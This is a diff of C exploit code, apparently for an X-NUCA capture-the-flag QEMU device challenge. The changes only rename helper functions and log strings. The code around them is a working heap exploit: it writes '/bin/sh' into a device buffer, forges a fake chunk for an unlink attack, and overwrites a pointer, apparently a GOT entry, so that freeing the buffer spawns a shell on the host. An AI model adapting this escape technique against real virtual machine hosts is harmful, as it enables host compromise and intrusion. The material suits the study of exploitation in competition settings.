@@ -99,23 +99,23 @@ void xnuca_read_authed() {
     printf("authed size: %llu\n", ioread(0x10));
 }
 
-void xnuca_dma_alloc(uint8_t idx, uint8_t size) {
+void xnuca_alloc(uint8_t idx, uint8_t size) {
     uint64_t addr = ((0x30) | (idx&0xf)<<8) | ((1&0xf)<<12) | ((size&0xff)<<16);
-    printf("xnuca dma alloc %llx\n", addr);
+    printf("xnuca  alloc %llx\n", addr);
     iowrite(addr, 0x0);
 }
 
-void xnuca_dma_edit(uint8_t idx, uint8_t offset, uint64_t val) {
+void xnuca_edit(uint8_t idx, uint8_t offset, uint64_t val) {
     //idx   : [0, 16)
     //offset: [0, 256)
     uint64_t addr = ((0x30) | (idx&0xf)<<8) | ((2&0xf)<<12) | ((offset&0xff)<<16);
-    printf("xnuca dma 1 %llx\n", addr);
+    printf("xnuca  1 %llx\n", addr);
     iowrite(addr, val);
 }
 
-void xnuca_dma_free(uint8_t idx) {
+void xnuca_free(uint8_t idx) {
     uint64_t addr = ((0x30) | (idx&0xf)<<8) | ((3&0xf)<<12) | ((0x0&0xff)<<16);
-    printf("xnuca dma 1 %llx\n", addr);
+    printf("xnuca  1 %llx\n", addr);
     iowrite(addr, 0x0);
 }
 
@@ -132,7 +132,7 @@ int main(int argc, char *argv[])
 
     printf("iomem @ %p\n", iomem);
 
-    // Allocate DMA buffer and obtain its physical address
+    // Allocate buffer and obtain its physical address
     buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (buf == MAP_FAILED)
         die("mmap");
@@ -148,35 +148,35 @@ int main(int argc, char *argv[])
     xnuca_set_timer();
 
     for (int i = 0; i < 0x100; i++) {
-        xnuca_dma_alloc(0x0, 0x80);
+        xnuca_alloc(0x0, 0x80);
     }
-    xnuca_dma_alloc(0x2, 0x80);
-    xnuca_dma_edit(0x2, 0x0, 0x6e69622f);
-    xnuca_dma_edit(0x2, 0x4, 0x68732f);
+    xnuca_alloc(0x2, 0x80);
+    xnuca_edit(0x2, 0x0, 0x6e69622f);
+    xnuca_edit(0x2, 0x4, 0x68732f);
 
 
-    xnuca_dma_alloc(0x3, 0x80);
-    xnuca_dma_alloc(0x4, 0x80);
+    xnuca_alloc(0x3, 0x80);
+    xnuca_alloc(0x4, 0x80);
 
-    xnuca_dma_edit(0x3, 0x0, 0x0);
-    xnuca_dma_edit(0x3, 0x4, 0x0);
-    xnuca_dma_edit(0x3, 0x8, 0x81);
-    xnuca_dma_edit(0x3, 0xc, 0x0);
-    xnuca_dma_edit(0x3, 0x10, 0x13a7ae0+0x18-0x18);
-    xnuca_dma_edit(0x3, 0x14, 0x0);
-    xnuca_dma_edit(0x3, 0x18, 0x13a7ae0+0x18-0x10);
-    xnuca_dma_edit(0x3, 0x1c, 0x0);
-    xnuca_dma_edit(0x3, 0x80, 0x80);
-    xnuca_dma_edit(0x3, 0x88, 0x90);
+    xnuca_edit(0x3, 0x0, 0x0);
+    xnuca_edit(0x3, 0x4, 0x0);
+    xnuca_edit(0x3, 0x8, 0x81);
+    xnuca_edit(0x3, 0xc, 0x0);
+    xnuca_edit(0x3, 0x10, 0x13a7ae0+0x18-0x18);
+    xnuca_edit(0x3, 0x14, 0x0);
+    xnuca_edit(0x3, 0x18, 0x13a7ae0+0x18-0x10);
+    xnuca_edit(0x3, 0x1c, 0x0);
+    xnuca_edit(0x3, 0x80, 0x80);
+    xnuca_edit(0x3, 0x88, 0x90);
 
-    xnuca_dma_edit(0x3, 0x88, 0x90);
-    xnuca_dma_free(0x4);
+    xnuca_edit(0x3, 0x88, 0x90);
+    xnuca_free(0x4);
 
-    xnuca_dma_edit(0x3, 0x0, 0x11B92C8);
-    xnuca_dma_edit(0x0, 0x0, 0x411420);
-    xnuca_dma_edit(0x0, 0x4, 0x0);
+    xnuca_edit(0x3, 0x0, 0x11B92C8);
+    xnuca_edit(0x0, 0x0, 0x411420);
+    xnuca_edit(0x0, 0x4, 0x0);
 
-    xnuca_dma_free(0x2);
+    xnuca_free(0x2);
 
     return 0;
 }
